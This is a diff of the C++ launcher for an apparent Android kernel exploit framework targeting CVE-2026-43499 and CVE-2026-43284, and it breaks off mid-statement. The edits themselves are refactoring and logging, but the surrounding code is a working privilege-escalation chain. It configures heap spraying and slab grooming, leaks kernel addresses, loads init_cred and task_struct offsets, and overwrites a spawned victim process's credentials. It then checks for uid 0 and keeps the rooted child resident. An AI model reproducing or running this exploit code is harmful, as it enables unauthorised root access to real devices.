@@ -31,8 +31,12 @@
 #include "pipeline/plan_gate.hpp"
 #include "profile/glkv3_document.hpp"
 #include "contract/op_registry.hpp"
+#include "pipeline/step_refusal.hpp"
+#include "backend/cve_2026_43499/steps/prepare_values_from_wire.hpp"
+#include "support/log.hpp"   /* ★ 用户裁定（2026-10-12）：异步日志接缝 ✓（⇒ 必须在 ifdef **之外** ✓） */
 
 #ifdef __ANDROID__
+#include "backend/cve_2026_43499/steps/access_binder.hpp"
 #include "backend/cve_2026_43499/steps/discovery_runner.hpp"
 #include "backend/cve_2026_43499/steps/prepare_runner.hpp"
 #include "backend/cve_2026_43499/seam/multicast_route_linux.hpp"
@@ -159,65 +163,69 @@ namespace {
     /** Read the 43499 preparation values out of the wire. The key list is the mapping table itself,
      *  so a key is spelled once in the tree; a missing key leaves its value at zero and the mapping
      *  is what refuses, by name. */
-    void read_43499_values(const script::WireDoc &doc, cve49::steps::PrepareValues &values) noexcept {
-        struct Slot final {
-            const char *input;
-            std::uint64_t *value;
-        };
-        const Slot slots[] = {
-            {"snitch_collisions", &values.snitch_collisions},
-            {"snitch_threads", &values.snitch_threads},
-            {"futex_table_size", &values.futex_table_size},
-            {"mm_struct_sz", &values.mm_struct_sz},
-            {"region_threads", &values.region_threads},
-            {"snitch_round_wait_us", &values.snitch_round_wait_us},
-            {"snitch_wake_rounds", &values.snitch_wake_rounds},
-            {"prepare_max_attempts", &values.prepare_max_attempts},
-            {"prepare_timeout_ms", &values.prepare_timeout_ms},
-            {"kernelsnitch_timeout_ms", &values.kernelsnitch_timeout_ms},
-            {"setup_settle_us", &values.setup_settle_us},
-            {"state_poll_interval_us", &values.state_poll_interval_us},
-            {"route_wait_ms", &values.route_wait_ms},
-            {"route_done_timeout_ms", &values.route_done_timeout_ms},
-            {"waiter_offset", &values.waiter_offset},
-            {"task_offset", &values.task_offset},
-            {"lock_offset", &values.lock_offset},
-            {"buffer_size", &values.buffer_size},
-            {"page_size", &values.page_size},
-            {"header_bytes", &values.header_bytes},
-            {"region_size", &values.region_size},
-            {"object_size", &values.object_size},
-            {"total_pokes", &values.total_pokes},
-            {"pre_groups", &values.pre_groups},
-            {"spray_groups", &values.spray_groups},
-            {"post_groups", &values.post_groups},
-            {"leak_groups", &values.leak_groups},
-            {"word_bytes", &values.word_bytes},
-            {"handle_bytes", &values.handle_bytes},
-            {"coarse_stride", &values.coarse_stride},
-            {"slab_stride", &values.slab_stride},
-            {"mm_objs_per_slab", &values.mm_objs_per_slab},
-            {"shaped", &values.shaped},
-            {"socket_buffer", &values.socket_buffer},
-            {"send_size", &values.send_size},
-        };
-        for (const Slot &slot : slots) {
-            for (std::size_t i = 0U; i < cve49::steps::kPrepareInputKeyCount; ++i) {
-                const cve49::steps::PrepareInputKey &row = cve49::steps::kPrepareInputKeys[i];
-                if (row.wire_key == nullptr || std::strcmp(row.input, slot.input) != 0) { continue; }
-                const script::JsonNode *node = doc.find(row.wire_key);
-                std::uint64_t value = 0U;
-                if (node == nullptr) { continue; }
-                /* 数字与 0x 串走 u64_of；bool 也算数（shaped 就是 bool）。 */
-                bool boolean = false;
-                if (doc.u64_of(*node, value)) {
-                    *slot.value = value;
-                } else if (doc.bool_of(*node, boolean)) {
-                    *slot.value = boolean ? 1U : 0U;
-                }
-            }
-        }
-    }
+    /* 旧码（原文保留，2026-10-12 裁定「main.cpp 只做 lua 启动器」）—— 本函数已搬去
+     *  backend/cve_2026_43499/steps/prepare_values_from_wire.hpp（函数体逐字相同）。
+     *  TODO(launcher-split): 完成 = 批A 全搬完 + 门禁全绿 + 用户确认 ⇒ 删本注释块。
+     *  机械改动（AGENTS section 3 例外）：仅移动位置与改名。 */
+    //     void read_43499_values(const script::WireDoc &doc, cve49::steps::PrepareValues &values) noexcept {
+    //         struct Slot final {
+    //             const char *input;
+    //             std::uint64_t *value;
+    //         };
+    //         const Slot slots[] = {
+    //             {"snitch_collisions", &values.snitch_collisions},
+    //             {"snitch_threads", &values.snitch_threads},
+    //             {"futex_table_size", &values.futex_table_size},
+    //             {"mm_struct_sz", &values.mm_struct_sz},
+    //             {"region_threads", &values.region_threads},
+    //             {"snitch_round_wait_us", &values.snitch_round_wait_us},
+    //             {"snitch_wake_rounds", &values.snitch_wake_rounds},
+    //             {"prepare_max_attempts", &values.prepare_max_attempts},
+    //             {"prepare_timeout_ms", &values.prepare_timeout_ms},
+    //             {"kernelsnitch_timeout_ms", &values.kernelsnitch_timeout_ms},
+    //             {"setup_settle_us", &values.setup_settle_us},
+    //             {"state_poll_interval_us", &values.state_poll_interval_us},
+    //             {"route_wait_ms", &values.route_wait_ms},
+    //             {"route_done_timeout_ms", &values.route_done_timeout_ms},
+    //             {"waiter_offset", &values.waiter_offset},
+    //             {"task_offset", &values.task_offset},
+    //             {"lock_offset", &values.lock_offset},
+    //             {"buffer_size", &values.buffer_size},
+    //             {"page_size", &values.page_size},
+    //             {"header_bytes", &values.header_bytes},
+    //             {"region_size", &values.region_size},
+    //             {"object_size", &values.object_size},
+    //             {"total_pokes", &values.total_pokes},
+    //             {"pre_groups", &values.pre_groups},
+    //             {"spray_groups", &values.spray_groups},
+    //             {"post_groups", &values.post_groups},
+    //             {"leak_groups", &values.leak_groups},
+    //             {"word_bytes", &values.word_bytes},
+    //             {"handle_bytes", &values.handle_bytes},
+    //             {"coarse_stride", &values.coarse_stride},
+    //             {"slab_stride", &values.slab_stride},
+    //             {"mm_objs_per_slab", &values.mm_objs_per_slab},
+    //             {"shaped", &values.shaped},
+    //             {"socket_buffer", &values.socket_buffer},
+    //             {"send_size", &values.send_size},
+    //         };
+    //         for (const Slot &slot : slots) {
+    //             for (std::size_t i = 0U; i < cve49::steps::kPrepareInputKeyCount; ++i) {
+    //                 const cve49::steps::PrepareInputKey &row = cve49::steps::kPrepareInputKeys[i];
+    //                 if (row.wire_key == nullptr || std::strcmp(row.input, slot.input) != 0) { continue; }
+    //                 const script::JsonNode *node = doc.find(row.wire_key);
+    //                 std::uint64_t value = 0U;
+    //                 if (node == nullptr) { continue; }
+    //                 /* 数字与 0x 串走 u64_of；bool 也算数（shaped 就是 bool）。 */
+    //                 bool boolean = false;
+    //                 if (doc.u64_of(*node, value)) {
+    //                     *slot.value = value;
+    //                 } else if (doc.bool_of(*node, boolean)) {
+    //                     *slot.value = boolean ? 1U : 0U;
+    //                 }
+    //             }
+    //         }
+    //     }
     /** Build the parameters one step needs: the wire"s values, the backend"s own hook plan, and the
      *  credentials the runtime handed over. A missing value is a named reason, never a zero. */
     const char *build_params(const script::WireDoc &doc, const cve::SaMaterial *sa,
@@ -242,9 +250,9 @@ namespace {
             !take("backend.cve_2026_43284.targets.dev_carrier", dev_carrier) ||
             !take("backend.cve_2026_43284.targets.patch1_target", patch_target) ||
             !take("backend.cve_2026_43284.targets.hook_target", hook_target)) {
-            return "step-target-missing";
+            return pipeline::step_refusal_name(pipeline::StepRefusal::StepTargetMissing);
         }
-        if (sa == nullptr || !sa->set) { return "session-frame-missing"; }
+        if (sa == nullptr || !sa->set) { return pipeline::step_refusal_name(pipeline::StepRefusal::SessionFrameMissing); }
         out.sa = *sa;
         out.carrier = {carrier.data(), carrier.size()};
         out.dev_carrier = {dev_carrier.data(), dev_carrier.size()};
@@ -265,7 +273,7 @@ namespace {
         if (!number("backend.cve_2026_43284.execution.trigger.delay_ms", delay) ||
             !number("backend.cve_2026_43284.execution.wait.budget_ms", budget) ||
             !number("backend.cve_2026_43284.execution.wait.poll_ms", poll)) {
-            return "step-execution-missing";
+            return pipeline::step_refusal_name(pipeline::StepRefusal::StepExecutionMissing);
         }
         out.trigger_delay_ms = static_cast<std::uint32_t>(delay);
         out.wait_ms = static_cast<std::uint32_t>(budget);
@@ -278,13 +286,13 @@ namespace {
             !take("backend.cve_2026_43284.markers.failed", failed) ||
             !take("backend.cve_2026_43284.markers.hook", hook_marker) ||
             !take("backend.cve_2026_43284.markers.module", module_marker)) {
-            return "step-markers-missing";
+            return pipeline::step_refusal_name(pipeline::StepRefusal::StepMarkersMissing);
         }
         out.success_marker = {loaded.data(), loaded.size()};
         out.failure_marker = {failed.data(), failed.size()};
         out.in_flight_marker = {hook_marker.data(), hook_marker.size()};
         out.module_marker = {module_marker.data(), module_marker.size()};
-        if (!out.consistent()) { return "step-params-inconsistent"; }
+        if (!out.consistent()) { return pipeline::step_refusal_name(pipeline::StepRefusal::StepParamsInconsistent); }
         return nullptr;
     }
 
@@ -318,11 +326,11 @@ namespace {
     }
 
     const char *run_wire_step(RunReport &report, std::string_view step) noexcept {
-        if (report.doc == nullptr) { return "step-no-document"; }
+        if (report.doc == nullptr) { return pipeline::step_refusal_name(pipeline::StepRefusal::StepNoDocument); }
         if (report.step_backend == "cve_2026_43499") {
             /* 43499 的三个窗口阶段：数字从 wire 取，真正的竞态是设备侧的，所以尝试钩子在这里是空。 */
             cve49::steps::WindowStep stage{};
-            if (!cve49::steps::window_step_by_name(step, stage)) { return "step-unknown"; }
+            if (!cve49::steps::window_step_by_name(step, stage)) { return pipeline::step_refusal_name(pipeline::StepRefusal::StepUnknown); }
             const auto take_stage = [&report](const std::string &suffix, std::uint64_t &into) noexcept {
                 const script::JsonNode *node = report.doc->find(std::string("backend.cve_2026_43499.execution.stages.") + suffix);
                 return node != nullptr && report.doc->u64_of(*node, into);
@@ -334,14 +342,14 @@ namespace {
                                 (stage == cve49::steps::WindowStep::W2 ? "w2_" : "w3_");
             if (!take_stage(std::string(prefix) + "attempts", a) ||
                 !take_stage(std::string(prefix) + "settle_us", s_us)) {
-                return "step-execution-missing";
+                return pipeline::step_refusal_name(pipeline::StepRefusal::StepExecutionMissing);
             }
             if (stage == cve49::steps::WindowStep::W3) {
-                if (!take_stage("w3_chain_rounds", extra)) { return "step-execution-missing"; }
+                if (!take_stage("w3_chain_rounds", extra)) { return pipeline::step_refusal_name(pipeline::StepRefusal::StepExecutionMissing); }
             }
             /* 值按映射表读（键只写一处），再按段映射：缺哪个值就报哪个名字。 */
             cve49::steps::PrepareValues values{};
-            read_43499_values(*report.doc, values);
+            ghostlock::backend::cve_2026_43499::steps::read_prepare_values_from_wire(*report.doc, values);
             cve49::steps::AllMapped mapped{};
             const char *mapped_refusal = nullptr;
             if (!cve49::steps::map_all_prepare(values, mapped, &mapped_refusal)) {
@@ -354,7 +362,7 @@ namespace {
             cve49::leak::RegionLayout layout{};
             if (cve49::leak::layout_snitch_region(mapped.region.inputs, layout) !=
                 cve49::leak::RegionVerdict::Ok) {
-                return "prepare-region-refused";
+                return pipeline::step_refusal_name(pipeline::StepRefusal::PrepareRegionRefused);
             }
             report.step_region_bytes = layout.total_bytes;
 #ifdef __ANDROID__
@@ -456,6 +464,17 @@ namespace {
                             static_cast<unsigned long long>(prepared.base),
                             static_cast<unsigned long long>(payload_delta),
                             static_cast<unsigned long long>(candidate), parity_ok ? 1 : 0);
+                /* ★ B 段 ✓（逐轮五值）：`log` 最多两数 ✗ ⇒ **分两条**（⇒ 合 critic L6：需要更多值时**加
+                 *  `log` 重载** ✗，而非另造名字 ✓）；失败轮用 `warn` ⇒ 高亮 ✓。 */
+                ghostlock::support::log(parity_ok ? "debug" : "warn", "prepare parity try",
+                                        static_cast<std::int64_t>(prepare_try),
+                                        static_cast<std::int64_t>(parity_ok ? 1 : 0));
+                /* ★ 地址一律用 `Hex` ✗（2026-10-12 教训 ✓）：`base` 是 **uint64** ✗ ⇒ 用数值重载会**印成负数** ✗
+                 *  ⇒ 我为此**连读两轮都误判**"负地址" ✗✓ ⇒ `Hex` 重载（`0x{:016x}` ✓）正是为此而设 ✓。 */
+                ghostlock::support::log(parity_ok ? "debug" : "warn", "prepare parity base",
+                                        ghostlock::support::Hex{prepared.base});
+                ghostlock::support::log(parity_ok ? "debug" : "warn", "prepare parity delta",
+                                        ghostlock::support::Hex{payload_delta});
             }
             report.prepare_status = prepared.status;
             report.prepare_at_step = prepared.at_step;
@@ -542,9 +561,9 @@ namespace {
             }
             if (spawn_refusal != cve_victim::SpawnRefusal::Ok) {
                 switch (spawn_refusal) {
-                    case cve_victim::SpawnRefusal::Pipes: return "victim-pipes-failed";
-                    case cve_victim::SpawnRefusal::Fork: return "victim-fork-failed";
-                    default: return "victim-leak-disagreed";
+                    case cve_victim::SpawnRefusal::Pipes: return pipeline::step_refusal_name(pipeline::StepRefusal::VictimPipesFailed);
+                    case cve_victim::SpawnRefusal::Fork: return pipeline::step_refusal_name(pipeline::StepRefusal::VictimForkFailed);
+                    default: return pipeline::step_refusal_name(pipeline::StepRefusal::VictimLeakDisagreed);
                 }
             }
             std::printf("main: victim spawned task=0x%llx", static_cast<unsigned long long>(spawned.task));
@@ -593,7 +612,7 @@ namespace {
                 const script::JsonNode *ic_node = report.doc->find("backend.cve_2026_43499.abi.offset.init_cred");
                 if (ic_node == nullptr || !report.doc->u64_of(*ic_node, init_cred_image) || init_cred_image == 0U) {
                     victim.retire_child();
-                    return "credential-image-missing";
+                    return pipeline::step_refusal_name(pipeline::StepRefusal::CredentialImageMissing);
                 }
                 /* 凭据拷贝布局：十五个键逐条从文档读，缺一个就具名拒绝（不设默认值）。 */
                 {
@@ -614,7 +633,7 @@ namespace {
                         const script::JsonNode *node = report.doc->find(full);
                         if (written <= 0 || node == nullptr || !report.doc->u64_of(*node, *key.slot)) {
                             victim.retire_child();
-                            return "credential-layout-missing";
+                            return pipeline::step_refusal_name(pipeline::StepRefusal::CredentialLayoutMissing);
                         }
                     }
                 }
@@ -639,14 +658,14 @@ namespace {
                     po_node == nullptr || !report.doc->u64_of(*po_node, phys_offset) ||
                     phys_offset == 0U || phys_load <= phys_offset) {
                     victim.retire_child();
-                    return "alias-arithmetic-missing";
+                    return pipeline::step_refusal_name(pipeline::StepRefusal::AliasArithmeticMissing);
                 }
                 const script::JsonNode *it_node = report.doc->find("backend.cve_2026_43499.abi.offset.init_task");
                 const script::JsonNode *rt_node = report.doc->find("backend.cve_2026_43499.abi.offset.root_task_group");
                 if (it_node == nullptr || !report.doc->u64_of(*it_node, init_task_image) || init_task_image == 0U ||
                     rt_node == nullptr || !report.doc->u64_of(*rt_node, root_task_group_image) || root_task_group_image == 0U) {
                     victim.retire_child();
-                    return "init-task-offset-missing";
+                    return pipeline::step_refusal_name(pipeline::StepRefusal::InitTaskOffsetMissing);
                 }
                 const script::JsonNode *cred_node = report.doc->find("backend.cve_2026_43499.abi.task_struct.cred");
                 const script::JsonNode *comm_node = report.doc->find("backend.cve_2026_43499.abi.task_struct.comm");
@@ -654,7 +673,7 @@ namespace {
                     victim_cred_off == 0U || comm_node == nullptr ||
                     !report.doc->u64_of(*comm_node, victim_comm_off) || victim_comm_off == 0U) {
                     victim.retire_child();
-                    return "victim-cred-offset-missing";
+                    return pipeline::step_refusal_name(pipeline::StepRefusal::VictimCredOffsetMissing);
                 }
             }
             /* 写目标 = 受害者的 cred 字段（退役同形）：受害者的 task 由准备阶段泄漏得到 ⇒
@@ -718,7 +737,7 @@ namespace {
                 /* 用**满足判据**的那一页（零写 + preserve_child 的奇偶要求）。 */
                 std::uint8_t *page = nullptr;   /* 页在 alias_delta 之后才挑（判据吃内核侧地址） */
                 /* 页在 alias_delta 之后才挑（见下），这里只查配置项。 */
-                if (route_values.buffer_size == 0U) { return "payload-page-unmapped"; }
+                if (route_values.buffer_size == 0U) { return pipeline::step_refusal_name(pipeline::StepRefusal::PayloadPageUnmapped); }
                 /* 别名实验：内容留在我们的映射里（能读回 ✓），绝对指针改用**泄漏候选**当别名基址。 */
                 const std::uint64_t leaked = report.snitch_found != 0U ? report.snitch_found
                                                               : report.discovery_found;
@@ -738,7 +757,7 @@ namespace {
                  *  越界 ✗）⇒ 发出去的字节里**不含页面** ⇒ 等于没发（真机量到 delta = -65536 ✗）。 */
                 page_image.assign(kOrder3 * kChunks, 0U);
                 page = page_image.data();
-                if (page == nullptr) { return "payload-page-unmapped"; }
+                if (page == nullptr) { return pipeline::step_refusal_name(pipeline::StepRefusal::PayloadPageUnmapped); }
                 static_cast<void>(our_page);
                 /* 页基址 = 真正承载内容那一页的别名（区域内 48K 起的载荷区），不是"区域 − delta"。 */
                 /* ★ 页面的内核地址 = 准备阶段的泄漏 base + 文档的 payload.delta（退役同形 ✓）。 */
@@ -937,10 +956,15 @@ namespace {
                     const std::uint64_t guard_target = static_cast<std::uint64_t>(page_request.target);
                     const std::uint64_t guard_lo = static_cast<std::uint64_t>(kAliasBase);
                     if (!(guard_target >= guard_lo && guard_target < guard_lo + (64ULL << 30U))   /* ★★ 第 208 轮 ✓：权威 `target.h` 的 `DIRECT_MAP_END = base + 64 GiB` ✓（原 `2^38` ✗ 大了 64 倍） */) {
-                        std::printf("main: target-outside-direct-map step=%s target=0x%llx",
-                                    step.data(), static_cast<unsigned long long>(guard_target));
+                        /* ★ M7 ＋ **P2** ✓（design-critic）：判据码**走日志且**只**走日志** ✗ ——
+                         *  原先此处的 `printf` 与日志**双输出** ✗ ⇒ 违背 L5「迁移后**原 printf 删除**、计数下降」✓；
+                         *  具名码用 `Text` ⇒ 与代码逐字相同 ✓；拒绝 ⇒ `warn` ✓；地址用 `Hex` ✓。 */
+                        ghostlock::support::log("warn", "step refused",
+                                                ghostlock::support::Text{"target-outside-direct-map"});
+                        ghostlock::support::log("warn", "step refused target",
+                                                ghostlock::support::Hex{guard_target});
                         victim.retire_child();
-                        return "target-outside-direct-map";
+                        return pipeline::step_refusal_name(pipeline::StepRefusal::TargetOutsideDirectMap);
                     }
                 }
                 /* ★ 建页**之后**的取样（第 52 轮 ✓）：旧哨兵在**建页之前**取 ✓ 且 after2 打的是 before 的
@@ -1160,8 +1184,12 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
             static cve49::race::WindowGuard window_guard{};
             window_guard.enter(contract::ExitPath::Success);
             cve49::steps::WindowStep named_step{};
-            if (!cve49::steps::window_step_by_name(step, named_step)) { return "step-unknown"; }
-            cve49::steps::WindowStageContext stage_context{};
+            if (!cve49::steps::window_step_by_name(step, named_step)) { return pipeline::step_refusal_name(pipeline::StepRefusal::StepUnknown); }
+            /* TODO(routeexec-compile-time): 机械改动 —— 上下文/绑定输入/access 都是**以路由类型参数化**的
+             *  模板了（用户裁定：编译期调用，见 docs/analysis/43499-plan-routeexec-compile-time.md）；
+             *  本层持有具体路由 `route`（:1178 那件）⇒ 在这里点明它的类型。
+             *  完成 = 三线门禁绿 ＋ 真机判据不变 ＋ 用户确认 ⇒ 删本标注。 */
+            cve49::steps::WindowStageContext<cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps>> stage_context{};
             stage_context.chain = words_region.word(0);
             /* 改挂目标用**干净**的字：被队列锤过的字会被内核判 EAGAIN（真机量到过），
              *  所以目标必须是队列没碰过的那一批。 */
@@ -1180,6 +1208,32 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
              *  上一轮只改参数 ✗ ⇒ 触发 guard（`value != config_.value` ⇒ Unsupported(59) ✓）⇒ 本轮同步改 ✓。
              *  旧码：route_values.value 来自文档毒值 0x4141… ✗；新码：用 layout 算出的真值 ✓。 */
             stage_context.payload_value = route_values.value;
+            /* ★★ 门面接管（2026-10-12 裁定「旧实现接入 kernel access」）：事实齐了就经 `Access` 落字 ——
+             *  `AccessSeam::land_word` ⇒ `MulticastWindow::write_word` ⇒ **先 warm-up（arm）再 execute** ✓
+             *  （⇒ 引擎此前直调 `execute` ✗ 会**绕过 warm-up** ✗，而 `arm_sequence` 的注释逐字要求那些轮必须发生 ✓）。
+             *  事实不全 ⇒ **不绑** ⇒ 引擎走具名回退 `stage_context.route` ✓（⇒ 行为与接线前一致，零回归 ✓）。 */
+            std::unique_ptr<cve49::MulticastWaiterAccess<cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps>>> access_owner;
+            {
+                cve49::steps::AccessBindInputs<cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps>> access_inputs{};
+                access_inputs.exec = &route;
+                access_inputs.limits = &route_built.config.limits;
+                access_inputs.target.mm_struct = found.mm_struct;
+                access_inputs.target.page_base = prepared.base;
+                access_inputs.target.fake_task = page_inputs.slots.fake_task;
+                access_inputs.target.fake_lock = page_inputs.slots.lock;
+                if (const char *access_why =
+                        cve49::steps::bind_stage_landing(access_inputs, access_owner, stage_context)) {
+                    std::printf("main: access not bound (%s) ⇒ route fallback", access_why);
+                    /* ★ 日志写在**事实之后** ✗（上一轮我插在绑定之前 ⇒ 它永远读 nullptr ⇒ 永远说 fallback ✗
+                     *  ⇒ **制造了假矛盾** ✓ ⇒ 教训：日志必须在其所述事实**已经发生**之后 ✓）。 */
+                    ghostlock::support::log("warn", "access -> route fallback");
+                } else {
+                    /* 正面读数（⇒ 让"绑成了"与"没执行到"可区分 ✓）：seam 非空才算真的接管 ✓。 */
+                    std::printf("main: access bound route=multicast_waiter seam=%d",
+                                stage_context.seam_landing != nullptr ? 1 : 0);
+                    ghostlock::support::log("info", "access -> facade takes the writes");
+                }
+            }
             cve49::steps::WindowStageRequest stage_request{};
             /* 阶段数值就是上面按 wire 的 stages.* 读到的那些（每步一支，字段同名）。 */
             stage_request.attempts = static_cast<std::uint32_t>(report.step_stage_attempts);
@@ -1336,7 +1390,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                                     repair_built.config};
                             
                             /* 修复轮走**同一条窗口路径**（直接 execute 时消费者没赢 ⇒ status=2/61 ✗）。 */
-                            cve49::steps::WindowStageContext repair_stage{};
+                            cve49::steps::WindowStageContext<cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps>> repair_stage{};
                             repair_stage.chain = words_region.word(0);
                             repair_stage.target = words_region.spare(0);
                             repair_stage.window = &window_guard;
@@ -1402,6 +1456,10 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                 std::uint32_t victim_uid = 0xFFFFFFFFU;
                 if (cve_victim::victim_report_uid(victim, victim_uid)) {
                     std::printf("main: victim uid=%u", static_cast<unsigned>(victim_uid));
+                    /* ★ B 段 ✓：uid 通道每轮一条 ⇒ **uid=0 用 warn 级** ✗ ⇒ 目标达成一瞬间即高亮 ✓✓
+                     *  （⇒ 本会话悬而未决的就是它 ✓）。 */
+                    ghostlock::support::log(victim_uid == 0U ? "warn" : "debug", "victim -> uid",
+                                            static_cast<std::int64_t>(victim_uid));
                     if (victim_uid == 0U) {
                         /* 扎根：拿到 root 的子进程必须驻留（退出会 kfree 静态 init_cred）。 */
                         report.victim_uid = victim_uid;
@@ -1441,12 +1499,12 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
         const script::JsonNode *door = report.doc->find(step_door_key(step));
         std::string_view door_path{};
         if (door == nullptr || !report.doc->str_of(*door, door_path) || door_path.empty()) {
-            return "step-target-missing";
+            return pipeline::step_refusal_name(pipeline::StepRefusal::StepTargetMissing);
         }
         report.step_door = door_path;
         if (report.params == nullptr) { return "step-no-params"; }
         cve::steps::PagecacheStep named{};
-        if (!cve::steps::pagecache_step_by_name(step, named)) { return "step-unknown"; }
+        if (!cve::steps::pagecache_step_by_name(step, named)) { return pipeline::step_refusal_name(pipeline::StepRefusal::StepUnknown); }
         cve::steps::StepContext context{};
         context.params = report.params;
         /* 复制成 NUL 结尾再交出去：文档里的字符串不是 C 串，执行体按 C 串读它
@@ -1544,11 +1602,30 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
         if (report == nullptr || view == nullptr || view->name == nullptr) { return; }
         ++report->calls;
         const std::string_view name(view->name);
+        if (name == "log") {
+            /* The eighth surface name (user ruling 2026-10-12). Two text arguments, and a
+             * level limited to debug and info: warn and error stay native, so a script cannot
+             * write a line that looks like a refusal (design-critic M1 item 3). A wrong shape
+             * or a level outside the subset is refused by the name already spelled here, and
+             * nothing is logged -- a script line is a line through the same seam as any other. */
+            const bool shapes_ok = view->arg_count >= 2U &&
+                                   view->args[0].kind == contract::ArgKind::Str &&
+                                   view->args[1].kind == contract::ArgKind::Str;
+            if (!shapes_ok) {
+                report->refusal = "param-invalid";
+                return;
+            }
+
+            /* 用户裁定（2026-10-12）：脚本想打印什么就打印什么 —— 级别与内容都不由这里审查 ✗；
+             *  判据侧的保护是**来源标记**（`[lua]` ✓），不是内容检查 ✓。 */
+            ghostlock::support::log(view->args[0].str, view->args[1].str);
+            return;
+        }
         if (name == "step") {
             /* The encapsulated steps: asked for by the name the wire declares
              *  (backend.<id>.steps), never by a list in here. The bodies are device work, so on a host
              *  without the seam the honest answer is a named refusal. */
-            if (view->arg_count < 2U || view->args[1].kind != script::ArgKind::Str) { return; }
+            if (view->arg_count < 2U || view->args[1].kind != contract::ArgKind::Str) { return; }
             const std::string_view step = view->args[1].str;
             /* 步的结论按**名字**原样报出来：脚本把它当返回值带走，这里不报就没人看得见。 */
             const auto report_step = [&report](const std::string_view which, const char *why) noexcept {
@@ -1563,7 +1640,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                 }
             }
             if (!declared) {
-                if (report->refusal == nullptr) { report->refusal = "step-unknown"; }
+                if (report->refusal == nullptr) { report->refusal = pipeline::step_refusal_name(pipeline::StepRefusal::StepUnknown); }
                 return;
             }
             ++report->steps;
@@ -1604,6 +1681,11 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                                 static_cast<int>(step.size()), step.data(),
                                 static_cast<unsigned long long>(round),
                                 static_cast<unsigned long long>(rounds), report->victim_uid);
+                    /* ★ D 段 ✓：**为何重试** —— uid 未达 0 ⇒ 把两个数字带上（⇒ 一条即判 ✓），
+                     *  `warn` 级 ⇒ 与 `victim -> uid` 的 0 级读数**成对**出现 ✓✓。 */
+                    ghostlock::support::log("warn", "retry -> uid not zero",
+                                            static_cast<std::int64_t>(report->victim_uid),
+                                            static_cast<std::int64_t>(round));
                     if (round >= rounds) { break; }
                     if (settle_us != 0U) { ::usleep(static_cast<useconds_t>(settle_us)); }
                 }
@@ -1957,6 +2039,35 @@ int main(int argc, char *argv[]) {
     }
     report.declared_steps = &declared_steps;
     report.doc = &doc;
+    /* ★ 日志启动（用户裁定 2026-10-12 ✓）：级别与路径**从 wire 读** ✗ —— `log.level` 缺 ⇒ **不启动**（⇒ 静默，
+     *  不写死默认 ✗）；路径空 ⇒ 只走 stderr ✓（⇒ 接缝的既定语义 ✓）。 */
+    {
+        std::string_view log_level{};
+        std::string_view log_path{};
+        const script::JsonNode *level_node = doc.find("log.level");
+        const script::JsonNode *path_node = doc.find("log.path");
+        if (level_node != nullptr) { (void)doc.str_of(*level_node, log_level); }
+        if (path_node != nullptr) { (void)doc.str_of(*path_node, log_path); }
+        if (!log_level.empty()) {
+            const bool up = ghostlock::support::logging::open(log_level, log_path);
+            /* ★ 上层打点（A 段 ✓）：启动器已过 wire 解析 ⇒ 阶段边界一条 ✓（⇒ 之后每条打点
+             *  都以"阶段名 -> 动作"开头 ✓，判据数字用 `log(…, a, b)` ✓）。 */
+            ghostlock::support::log("info", up ? "launcher -> logging up" : "launcher -> logging refused");
+            std::printf("main: log %s level=%.*s", up ? "started" : "refused",
+                        static_cast<int>(log_level.size()), log_level.data());
+        }
+    }
+
+    /* Every exit from here on must leave the log with its last line: the exit code, followed
+     *  by the drain. The refusal path used to return early (rc=9) and skipped both, so the
+     *  device log ended on whatever line happened to be written last (the missing exit-code).
+     *  @param code the process exit code this path returns
+     *  @return code, so callers read `return finish(...)` at every exit. */
+    const auto finish = [](int code) noexcept {
+        ghostlock::support::log("info", "exit-code", static_cast<std::int64_t>(code));
+        (void)ghostlock::support::logging::close();
+        return code;
+    };
 
     script::CallSink sink{};
     sink.context = &report;
@@ -1965,18 +2076,18 @@ int main(int argc, char *argv[]) {
     script::Sandbox sandbox;
     if (!sandbox.open(budget, sink)) {
         std::printf("main: sandbox refused (open-refused)");
-        return 7;
+        return finish(7);
     }
     if (!fields.empty() && !sandbox.set_cfg_snapshot(fields.data(), fields.size())) {
         std::printf("main: sandbox refused (cfg-refused)");
-        return 7;
+        return finish(7);
     }
     std::vector<char> script(kScriptCap);
     const std::string_view code = text_of(doc, doc.child(*step, "code"));
     const std::size_t script_size = script::WireDoc::base64_decode(code, std::span<char>(script));
     if (script_size == 0U) {
         std::printf("main: wire refused (step-malformed)");
-        return 4;
+        return finish(4);
     }
     const script::ScriptRejection rejection = sandbox.run_procedure(std::string_view(script.data(), script_size));
     sandbox.close();
@@ -2018,12 +2129,24 @@ int main(int argc, char *argv[]) {
                 report.fields, report.skipped, payloads.size(), report.calls, report.handoffs, report.steps);
     if (report.refusal != nullptr) {
         std::printf("main: refused (%s)\n", report.refusal);
-        return 9;
+        return finish(9);   /* the refusal path used to skip the exit-code line and the drain */
     }
     /* 拿到 root 的硬证据：链跑完之后看自己的凭据（只读，不做任何事）。 */
     std::printf("main: after uid=%u euid=%u gid=%u egid=%u", static_cast<unsigned>(::getuid()),
                 static_cast<unsigned>(::geteuid()), static_cast<unsigned>(::getgid()),
                 static_cast<unsigned>(::getegid()));
     std::printf("main: verdict %s\n", ghostlock::script::script_rejection_name(rejection));
-    return rejection == script::ScriptRejection::None ? 0 : 10;
+    /* ★ E 段 ✓：Lua 结局 —— 名字进日志 ✗（⇒ 用 `what` 承载 ✓）＋ **拒绝码**带数字 ✓
+     *  ⇒ ⇒ 与 D 段成对：**拒绝码 ⇒ 为何重试/为何停** ✓（⇒ 一条 grep 即判 ✓）。 */
+    ghostlock::support::log(rejection == script::ScriptRejection::None ? "info" : "warn",
+                            rejection == script::ScriptRejection::None ? "lua -> verdict clean"
+                                                                      : "lua -> verdict refused");
+    ghostlock::support::log(rejection == script::ScriptRejection::None ? "info" : "warn",
+                            "lua -> rejection code",
